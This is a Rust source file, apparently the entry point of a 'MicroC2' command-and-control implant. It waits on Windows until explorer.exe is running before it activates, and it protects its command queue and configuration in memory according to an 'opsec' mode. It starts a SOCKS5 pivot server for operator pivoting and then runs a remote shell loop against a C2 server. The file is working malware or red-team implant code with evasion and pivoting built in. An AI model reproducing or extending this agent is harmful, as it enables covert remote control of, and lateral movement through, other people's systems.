mod commands;
mod config;
mod dormant;
mod networking;
mod opsec;
mod util;

use crate::commands::command_shell::run_shell;
use crate::config::AgentConfig;
use crate::dormant::MemoryProtector;
use crate::dormant::SensitiveState;
use crate::networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use crate::opsec::{OpsecLevel, AgentMode, determine_agent_mode, OPSEC_STATE};
use crate::util::random_jitter;
use log::{info, warn, error, debug};
use once_cell::sync::Lazy;
use rand::Rng;
use std::env;
use std::sync::Arc;
use std::sync::Mutex;
use std::time::Duration;
use tokio::time;

static MEMORY_PROTECTOR: Lazy<Mutex<MemoryProtector>> = Lazy::new(|| {
    Mutex::new(MemoryProtector::new(SensitiveState {
        command_queue: Vec::new(),
        file_buffer: Vec::new(),
        config: None,
    }))
});

// Dormant startup function
// This function is called on Windows to wait for the system to be idle before starting the agent
// It checks for the presence of explorer.exe and waits for up to 10 minutes
#[cfg(target_os = "windows")]
fn dormant_startup() {
    use sysinfo::{System, SystemExt, ProcessExt};
    let mut sys = System::new_all();
    let start = std::time::Instant::now();
    // Wait up to 10 minutes or until explorer.exe is running
    while start.elapsed().as_secs() < 600 {
        sys.refresh_processes();
        if sys.processes_by_name("explorer.exe").next().is_some() {
            break;
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    dormant_startup();

    env_logger::init();
    info!("[STARTUP] MicroC2 Agent starting...");

    let config = AgentConfig::load()?;
    info!("[CONFIG] Loaded agent config: {:?}", config);

    // Channel for pivot frames
    let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
    let pivot_handler = Arc::new(tokio::sync::Mutex::new(Socks5PivotHandler::new(pivot_tx.clone())));

    if config.socks5_enabled {
        info!("[CONFIG] SOCKS5 is enabled. Proxy: {}:{}, all C2 traffic will use SOCKS5 Proxy tunnel.", config.socks5_host, config.socks5_port);

        // Start SOCKS5 pivot server for operator-side pivoting
        let pivot_server = Socks5PivotServer::new(
            config.socks5_host.clone(),
            config.socks5_port,
            pivot_tx.clone(),
        );
        let pivot_handler_clone = pivot_handler.clone();
        tokio::spawn(async move {
            pivot_server.run(pivot_handler_clone).await;
        });
    } else {
        warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
    }

    // Spawn pivot frame handler in background
    let pivot_handler_bg = pivot_handler.clone();
    tokio::spawn(async move {
        while let Some(frame) = pivot_rx.recv().await {
            pivot_handler_bg.lock().await.handle_frame(frame).await;
        }
    });

    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    let agent_id = config.payload_id.clone();
    println!("[INFO] Agent ID: {}", agent_id);
    println!("[INFO] Using embedded configuration");

    info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);

    // Only call run_shell ONCE; all polling/sleeping is handled inside run_shell
    if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
        error!("[ERROR] Shell error: {}. Exiting...", e);
    }

    Ok(())
}

fn on_mode_transition(new_mode: AgentMode) {
    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
    match new_mode {
        AgentMode::FullOpsec => protector.protect(),
        AgentMode::BackgroundOpsec => protector.unprotect(),
    }
}

fn cleanup() {
    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
    protector.zeroize();
}
